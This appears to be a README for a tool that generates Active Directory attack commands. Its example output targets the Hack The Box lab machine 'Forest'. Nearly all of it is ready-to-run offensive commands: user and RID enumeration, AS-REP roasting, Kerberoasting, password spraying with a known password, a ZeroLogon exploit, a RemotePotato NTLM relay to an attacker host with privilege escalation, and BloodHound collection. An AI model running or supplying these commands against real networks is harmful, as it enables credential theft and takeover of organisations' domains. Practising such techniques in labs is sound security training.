  Enter in info about a target, and the script will fill out the most common commands for you! 
  Example Output:   
```# Zone transfer (Unlikely with AD)
dig axfr htb.local @10.10.10.161

# Guest RID brute
netexec smb htb.local -u anonymous -p '' --rid-brute 10000
impacket-lookupsid htb.local/anonymous@10.10.10.161

# Authenticated RID brute
netexec smb htb.local -u svc-alfresco -p 's3rvice' --rid-brute 10000
impacket-lookupsid htb.local/svc-alfresco:'s3rvice'@htb.local

# Kerbrute user enumeration
kerbrute userenum -d htb.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.161

# RPC Enumeration
rpcclient -U "svc-alfresco" -N 10.10.10.161

# AS Rep Roasting
for user in $(cat users.txt); do /usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb.local/${user} | grep -v Impacket; done

# Kerberoasting
faketime -f +7h GetUserSPNs.py -target-domain htb.local -usersfile users.txt -dc-ip FOREST.htb.local htb.local/guest -no-pass
faketime -f +7h GetUserSPNs.py -request -dc-ip 10.10.10.161 htb.local/svc-alfresco -save -outputfile GetUserSPNs.out
GetUserSPNs.py -no-preauth 'svc-alfresco' -usersfile 'users.txt' -dc-host 'FOREST.htb.local' 'htb.local'/

# Password Spray
netexec smb 10.10.10.161 -u users.txt -p 's3rvice' --continue-on-success

# LDAP Enumeration
ldapsearch -x -H ldap://10.10.10.161 -b "dc=htb,dc=local" | grep 'userPrincipalName' | tr '@' ' ' | awk '{print $2}' > users.txt
kerbrute userenum --dc FOREST.htb.local -d htb.local users.txt

# ZeroLogon Check
sudo python ~/tools/CVE-2020-1472-master/cve-2020-1472-exploit.py FOREST 10.10.10.161

# RemotePotato Check
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.10.161:9999
sudo impacket-ntlmrelayx -t ldap://10.10.10.161 --no-wcf-server --escalate-user normal_user
.\RemotePotato0.exe -m 2 -r 10.10.14.2 -x 10.10.14.2 -p 9999 -s 1

# Bloodhound Python injestor
faketime -f +7h bloodhound-python -c ALL -u 'svc-alfresco' -p 's3rvice' -d htb.local -dc FOREST.htb.local -ns 10.10.10.161

# Powerview.py enumeration
faketime -f +7h getTGT.py htb.local/svc-alfresco:'s3rvice'
export KRB5CCNAME=./svc-alfresco.ccache
faketime -f +7h powerview htb.local/svc-alfresco@10.10.10.161 -k --no-pass --dc-ip 10.10.10.161
